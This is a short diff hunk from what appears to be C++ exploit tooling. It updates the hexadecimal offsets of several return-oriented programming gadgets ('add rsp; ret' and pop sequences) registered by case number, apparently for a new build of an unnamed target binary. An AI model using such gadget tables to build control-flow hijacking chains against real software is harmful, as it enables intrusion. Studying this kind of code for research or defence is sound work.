@@ -86,19 +86,19 @@ public:
             this->AddGadget(0xbb476a, "add rsp, 0x20; ret;");
             break;
         case 5:
-            this->AddGadget(0x2055f6, "add rsp, 0x28; ret;");
+            this->AddGadget(0x202e6c, "add rsp, 0x28; ret;");
             break;
         case 6:
-            this->AddGadget(0x51f884, "pop ...; pop ...; pop ...; pop ...; pop ...; pop ...; ret;");
+            this->AddGadget(0x51f7b4, "pop ...; pop ...; pop ...; pop ...; pop ...; pop ...; ret;");
             break;
         case 7:
-            this->AddGadget(0x20057e, "add rsp, 0x38; ret;");
+            this->AddGadget(0x202f35, "add rsp, 0x38; ret;");
             break;
         case 8:
-            this->AddGadget(0x3ebb2c, "pop ...; add rsp, 0x20; pop ...; pop ...; pop ...; ret;");
+            this->AddGadget(0x3e9c4c, "pop ...; add rsp, 0x20; pop ...; pop ...; pop ...; ret;");
             break;
         case 9:
-            this->AddGadget(0x202ed7, "add rsp, 0x48; ret;");
+            this->AddGadget(0x2081d4, "add rsp, 0x48; ret;");
             break;
         case 10:
             this->AddGadget(0x73462c, "pop ...; add rsp, 0x48; ret;");
